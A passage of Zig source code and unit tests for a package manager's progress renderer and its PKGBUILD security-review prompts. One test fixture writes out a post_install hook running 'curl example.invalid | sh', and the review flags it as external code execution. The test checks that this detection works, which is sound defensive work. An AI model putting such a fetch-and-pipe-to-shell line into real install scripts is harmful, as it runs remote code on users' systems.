        .animate = false,
        .owned_data = std.heap.ArenaAllocator.init(arena.allocator()),
    };
    defer renderer.deinit();

    try renderer.writeBarLine(.{
        .operation_id = 1,
        .name = "a-very-long-package-name.pkg.tar.zst",
        .action = "PackageDownload",
        .current = 50,
        .total = 100,
        .percentage = 50,
    });
    const rendered = stdout.writer.buffered();
    try std.testing.expectEqual(@as(usize, 40), rendered.len);
    try std.testing.expectEqual(@as(u8, '\n'), rendered[rendered.len - 1]);
    try std.testing.expect(std.mem.endsWith(u8, rendered, "  50%\n"));
}

fn renderBar(
    writer: *std.Io.Writer,
    percentage: u8,
    frame: usize,
    style: ProgressStyle,
    width: usize,
    ascii_only: bool,
) !void {
    const filled = width * percentage / 100;
    switch (style) {
        .blocks => {
            if (ascii_only) {
                try writer.splatByteAll('#', filled);
                try writer.splatByteAll('-', width - filled);
            } else {
                for (0..filled) |_| try writer.writeAll("█");
                for (filled..width) |_| try writer.writeAll("░");
            }
        },
        .pacman => {
            if (filled > 0) {
                try writer.splatByteAll('-', filled - 1);
                try writer.writeByte(if (percentage < 100 and frame & 1 == 0) 'C' else if (percentage < 100) 'c' else '-');
            }
            for (filled..width) |index| {
                try writer.writeByte(if (percentage < 100 and (index - filled) % 2 == 0) 'o' else ' ');
            }
        },
    }
}

fn automaticResponse(kind: Zigalpm.OperationQuestionKind) Zigalpm.OperationQuestionResponse {
    return switch (kind) {
        .confirmation, .confirm_transaction, .review_changes => .accepted,
        .import_pgp_key => .declined,
        .select_one, .select_provider => .{ .choice = 0 },
        .select_many, .select_optional_dependencies => .{ .choices = &.{} },
    };
}

fn safeReviewDefault(question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
    return switch (question.default_response) {
        .accepted => .accepted,
        else => .declined,
    };
}

fn hasSecurityFindings(question: Zigalpm.OperationQuestion) bool {
    const review = question.review orelse return false;
    return review.findings.len != 0;
}

fn defaultResponse(question: Zigalpm.OperationQuestion) Zigalpm.OperationQuestionResponse {
    return switch (question.default_response) {
        .default, .deferred => automaticResponse(question.kind),
        else => question.default_response,
    };
}

test "redirected single-pane output suppresses intermediate progress and finalizes transactions" {
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    var absolute_buffer: [std.Io.Dir.max_path_bytes]u8 = undefined;
    const absolute_length = try temporary.dir.realPath(std.testing.io, &absolute_buffer);

    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var environment = std.process.Environ.Map.init(arena.allocator());
    try environment.put("XDG_CONFIG_HOME", absolute_buffer[0..absolute_length]);
    try environment.put("COLUMNS", "80");
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
        .environment = &environment,
    };
    var renderer = try Renderer.init(&context, true);
    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
    defer {
        renderer.detach();
        operation_context.deinit();
        renderer.deinit();
    }
    try renderer.attach(&operation_context);

    try renderer.begin("Synchronizing package databases...");
    var operation = operation_context.begin(.{ .backend = .download, .kind = .download, .subject = "extra.db" });
    operation.reportError(error.TestRecoverableFailure, "optional cleanup failed", "test", null, true);
    operation.reportError(error.TestFatalFailure, "required transaction failed", "test", null, false);
    operation.status(.information, "Download started", "download.start", null);
    operation.progress(.{ .completed = 50, .total = 100, .percentage = 50, .stage = "download" });
    operation.progress(.{ .completed = 100, .total = 100, .percentage = 100, .stage = "download" });
    operation.status(.success, "Download completed", "download.complete", null);
    var package_download = operation_context.begin(.{ .backend = .download, .kind = .download, .subject = "demo.pkg.tar.zst" });
    package_download.progress(.{
        .stage = "download",
        .completed = 1024,
        .total = 1024,
        .percentage = 100,
        .bytes_completed = 1024,
        .bytes_total = 1024,
        .bytes_per_second = 512,
    });
    package_download.finish(.success);
    operation.status(.information, "post-install output", "alpm.scriptlet", null);
    operation.progress(.{ .stage = "hook", .message = "Refreshing system state" });
    operation.status(.warning, "/etc/demo.conf", "alpm.pacnew", null);
    operation.status(.warning, "/etc/old.conf.pacsave", "alpm.pacsave", null);
    operation.status(.information, "core/new replaces old", "alpm.replaces", null);
    operation.finish(.success);
    var install = operation_context.begin(.{ .backend = .alpm, .kind = .install, .subject = "demo" });
    install.progress(.{ .completed = 1, .total = 1, .percentage = 100, .native_code = 1 });
    install.finish(.success);
    var flatpak = operation_context.begin(.{ .backend = .flatpak, .kind = .install, .subject = "org.example.App" });
    flatpak.progress(.{ .percentage = 100, .stage = "Downloading", .message = "org.example.App" });
    flatpak.status(.success, "Flatpak installed", "flatpak.success", null);
    flatpak.finish(.success);
    var aur = operation_context.begin(.{ .backend = .aur, .kind = .build, .subject = "aur-demo" });
    aur.progress(.{ .percentage = 100, .message = "aur-demo", .native_code = 200 });
    aur.finish(.success);
    try renderer.finish(true);

    const rendered = stdout.writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: Synchronizing package databases...") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: Retrieving packages...") != null);
    try std.testing.expectEqual(@as(usize, 1), std.mem.count(u8, rendered, "DatabaseDownload extra.db"));
    try std.testing.expectEqual(@as(usize, 1), std.mem.count(u8, rendered, "PackageDownload demo.pkg.tar.zst"));
    try std.testing.expect(std.mem.indexOf(u8, rendered, "100%") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Download started") == null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Download completed") == null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "warning: optional cleanup failed") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "error: required transaction failed") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Scriptlet: post-install output") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Hook: Refreshing system state") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: pacnew stored @ /etc/demo.conf.pacnew") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: pacsave stored @ /etc/old.conf.pacsave") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: core/new replaces old") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "UpgradeStart demo") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Downloading org.example.App") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Flatpak installed") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "MakepkgBuild aur-demo") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, ":: Transaction complete.") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, " 50%") == null);
}

test "single-pane clears unknown-length bars on completion and suppresses AUR metadata" {
    var temporary = std.testing.tmpDir(.{});
    defer temporary.cleanup();
    var absolute_buffer: [std.Io.Dir.max_path_bytes]u8 = undefined;
    const absolute_length = try temporary.dir.realPath(std.testing.io, &absolute_buffer);

    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var environment = std.process.Environ.Map.init(arena.allocator());
    try environment.put("XDG_CONFIG_HOME", absolute_buffer[0..absolute_length]);
    try environment.put("COLUMNS", "80");
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
        .environment = &environment,
        .stdin_is_tty = true,
        .stdout_is_tty = true,
    };
    var renderer = try Renderer.init(&context, true);
    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
    defer {
        renderer.detach();
        operation_context.deinit();
        renderer.deinit();
    }
    try renderer.attach(&operation_context);

    var first = operation_context.begin(.{
        .backend = .download,
        .kind = .download,
        .subject = "same-name.pkg.tar.zst",
    });
    first.progress(.{
        .stage = "download",
        .bytes_completed = 4096,
    });
    try std.testing.expectEqual(@as(usize, 1), renderer.bars.items.len);
    try std.testing.expectEqual(first.envelope.operation_id, renderer.bars.items[0].operation_id);

    var second = operation_context.begin(.{
        .backend = .download,
        .kind = .download,
        .subject = "same-name.pkg.tar.zst",
    });
    second.progress(.{
        .stage = "download",
        .bytes_completed = 8192,
    });
    try std.testing.expectEqual(@as(usize, 2), renderer.bars.items.len);

    first.finish(.success);
    try std.testing.expectEqual(@as(usize, 1), renderer.bars.items.len);
    try std.testing.expectEqual(second.envelope.operation_id, renderer.bars.items[0].operation_id);

    var rpc = operation_context.begin(.{
        .backend = .download,
        .kind = .download,
        .subject = "https://aur.archlinux.org/rpc/",
    });
    rpc.progress(.{
        .stage = "aur-http",
        .bytes_completed = 512,
    });
    rpc.finish(.success);
    try std.testing.expectEqual(@as(usize, 1), renderer.bars.items.len);
    try std.testing.expect(std.mem.indexOf(u8, stdout.writer.buffered(), "PackageDownload rpc") == null);

    second.finish(.success);
    try std.testing.expectEqual(@as(usize, 0), renderer.bars.items.len);
}

test "single-pane no-confirm uses the shared automatic question policy" {
    try std.testing.expect(automaticResponse(.confirmation) == .accepted);
    try std.testing.expect(automaticResponse(.import_pgp_key) == .declined);
    try std.testing.expectEqual(@as(usize, 0), automaticResponse(.select_provider).choice);
    try std.testing.expectEqual(@as(usize, 0), automaticResponse(.select_optional_dependencies).choices.len);
}

test "single-pane renders complete transaction plans and build-time unknowns" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
    };
    var renderer = try Renderer.init(&context, true);
    renderer.settings.size_display = .bytes;
    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
    defer {
        renderer.detach();
        operation_context.deinit();
        renderer.deinit();
    }
    try renderer.attach(&operation_context);

    const packages = [_]Zigalpm.OperationTransactionPackage{
        .{
            .name = "demo",
            .source = .aur,
            .role = .requested,
        },
        .{
            .name = "cmake",
            .version = "4.0.3-1",
            .repository = "extra",
            .source = .repository,
            .role = .build_dependency,
            .download_size = 1024,
            .installed_size = 4096,
        },
    };
    var operation = operation_context.begin(.{ .backend = .aur, .kind = .install, .subject = "demo" });
    var answer = try operation.ask(.{
        .kind = .confirm_transaction,
        .prompt = "Proceed with installation?",
        .transaction_plan = .{
            .action = .install,
            .packages = &packages,
        },
    });
    defer answer.deinit(arena.allocator());
    operation.finish(.success);

    try std.testing.expect(answer.response == .accepted);
    const rendered = stdout.writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, rendered, "demo version determined during build") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Determined during build") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "cmake 4.0.3-1 [build dependency, repository]") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "1024 B") != null);
}

test "single-pane risky PKGBUILD review bypasses no-confirm and requires approval" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var stdin = std.Io.Reader.fixed("yes\n");
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdin = &stdin,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
    };
    var renderer = try Renderer.init(&context, true);
    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
    defer {
        renderer.detach();
        operation_context.deinit();
        renderer.deinit();
    }
    try renderer.attach(&operation_context);

    const findings = [_]Zigalpm.OperationReviewFinding{.{
        .tool = "curl",
        .severity = .critical,
        .hook = "post_install",
        .matched_line = "curl example.invalid | sh",
        .message = "external code execution",
    }};
    const files = [_]Zigalpm.OperationQuestionAttachment{.{
        .name = "demo.install",
        .content = "post_install() { curl example.invalid | sh; }",
    }};
    var operation = operation_context.begin(.{ .backend = .aur, .kind = .install, .subject = "demo" });
    var answer = try operation.ask(.{
        .kind = .review_changes,
        .prompt = "Proceed with update to demo?",
        .review = .{
            .subject = "demo",
            .old_content = "pkgver=1",
            .new_content = "pkgver=2",
            .findings = &findings,
            .related_files = &files,
        },
        .default_response = .declined,
    });
    defer answer.deinit(arena.allocator());
    operation.finish(.success);

    try std.testing.expect(answer.response == .accepted);
    const rendered = stdout.writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, rendered, "PKGBUILD security warnings") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "curl used in post_install") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "Source file: demo.install") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=1") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=2") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "(y/N)") != null);
}

test "interactive PKGBUILD review renders unified diff and honors risky default" {
    var arena = std.heap.ArenaAllocator.init(std.testing.allocator);
    defer arena.deinit();
    var stdout = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stdout.deinit();
    var stderr = std.Io.Writer.Allocating.init(std.testing.allocator);
    defer stderr.deinit();
    var stdin = std.Io.Reader.fixed("\n");
    var context: runtime.RuntimeContext = .{
        .allocator = arena.allocator(),
        .io = std.testing.io,
        .stdin = &stdin,
        .stdout = &stdout.writer,
        .stderr = &stderr.writer,
    };
    var renderer = try Renderer.init(&context, false);
    var operation_context = Zigalpm.OperationContext.init(arena.allocator(), std.testing.io);
    defer {
        renderer.detach();
        operation_context.deinit();
        renderer.deinit();
    }
    try renderer.attach(&operation_context);

    const findings = [_]Zigalpm.OperationReviewFinding{.{
        .tool = "<homograph>",
        .severity = .critical,
        .hook = "pkgname",
        .matched_line = "dеmo",
        .message = "possible homograph",
    }};
    var operation = operation_context.begin(.{ .backend = .aur, .kind = .update, .subject = "demo" });
    var answer = try operation.ask(.{
        .kind = .review_changes,
        .prompt = "Proceed with update to demo?",
        .review = .{
            .subject = "demo",
            .old_content = "pkgver=1\npkgrel=1",
            .new_content = "pkgver=2\npkgrel=1",
            .findings = &findings,
        },
        .default_response = .declined,
    });
    defer answer.deinit(arena.allocator());
    operation.finish(.cancelled);

    try std.testing.expect(answer.response == .declined);
    const rendered = stdout.writer.buffered();
    try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=1") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "pkgver=2") != null);
    try std.testing.expect(std.mem.indexOf(u8, rendered, "(y/N)") != null);
}
